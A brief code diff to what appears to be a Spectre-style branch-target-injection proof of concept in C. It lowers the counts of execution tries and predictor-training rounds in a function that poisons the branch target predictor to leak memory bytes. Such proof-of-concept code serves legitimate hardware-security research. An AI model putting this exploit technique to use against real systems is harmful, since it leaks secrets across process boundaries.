@@ -74,12 +74,12 @@ void readByte(char *addr_to_read, char result[2], int score[2])
   }
 
   // BYTE EXECUTION ROUNDS
-  for (tries = 1999; tries > 0; tries--) {
+  for (tries = 999; tries > 0; tries--) {
     // poison branch target predictor
     *target = (uint64_t)&gadget;
     _mm_mfence();
     // TRAINING ROUNDS
-    for (j = 59; j > 0; j--) {
+    for (j = 29; j > 0; j--) {
       junk ^= victim(&dummyChar, 0);
     }
     _mm_mfence();
